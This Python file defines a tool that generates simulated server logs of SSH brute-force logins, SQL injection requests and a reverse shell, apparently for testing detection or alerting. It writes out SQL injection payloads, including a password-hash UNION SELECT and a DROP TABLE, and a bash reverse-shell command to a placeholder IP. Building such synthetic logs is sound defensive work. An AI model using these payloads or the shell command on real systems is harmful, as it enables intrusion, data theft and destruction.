import time
import random
from typing import List, Dict, Any

class LogStreamTool:
    """
    Simulates real-time server streams containing brute-force SSH attempts,
    SQL injections, and reverse-shell indicators.
    """
    
    @staticmethod
    def get_ssh_brute_force_logs(attacker_ip: str = "192.168.1.150", target_user: str = "root") -> List[str]:
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        logs = []
        # Simulate multiple failed attempts followed by a success (or just failures)
        for i in range(5):
            port = random.randint(30000, 60000)
            logs.append(f"{timestamp} sshd[2201]: Failed password for {target_user} from {attacker_ip} port {port} ssh2")
        # Optional: Add successful login to trigger alert escalation
        port = random.randint(30000, 60000)
        logs.append(f"{timestamp} sshd[2201]: Accepted password for {target_user} from {attacker_ip} port {port} ssh2")
        return logs

    @staticmethod
    def get_sql_injection_logs(attacker_ip: str = "203.0.113.45") -> List[str]:
        timestamp = time.strftime("%d/%b/%Y:%H:%M:%S +0000", time.gmtime())
        queries = [
            "1' OR '1'='1",
            "1 UNION SELECT username, password_hash FROM admin_users",
            "1; DROP TABLE logs; --",
            "admin' --"
        ]
        logs = []
        for query in queries:
            # URL encoded variant
            encoded_query = query.replace(" ", "%20").replace("'", "%27").replace(";", "%3B")
            logs.append(
                f"nginx[1022]: {attacker_ip} - - [{timestamp}] "
                f"\"GET /login?user={encoded_query} HTTP/1.1\" 500 1024 "
                f"\"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
            )
        return logs

    @staticmethod
    def get_reverse_shell_logs(attacker_ip: str = "198.51.100.12", attacker_port: int = 4444) -> List[str]:
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        pid = random.randint(5000, 15000)
        return [
            f"{timestamp} auditd[{pid}]: type=EXECVE msg=audit(1625573421.321:{random.randint(100,999)}): "
            f"argc=4 a0=\"bash\" a1=\"-i\" a2=\">&\" a3=\"/dev/tcp/{attacker_ip}/{attacker_port}\"",
            f"{timestamp} systemd[1]: Process {pid} (bash) spawned interactive shell to remote endpoint {attacker_ip}:{attacker_port}"
        ]

    @classmethod
    def generate_logs(cls, category: str = "all") -> List[str]:
        """
        Generates a consolidated stream of logs.
        """
        logs = []
        if category in ("ssh", "all"):
            logs.extend(cls.get_ssh_brute_force_logs())
        if category in ("sqli", "all"):
            logs.extend(cls.get_sql_injection_logs())
        if category in ("revshell", "all"):
            logs.extend(cls.get_reverse_shell_logs())
        
        # Add some normal noise
        timestamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        logs.insert(0, f"{timestamp} systemd[1]: Started System Logging Service.")
        logs.append(f"{timestamp} cron[832]: (root) CMD (run-parts /etc/cron.hourly)")
        
        return logs
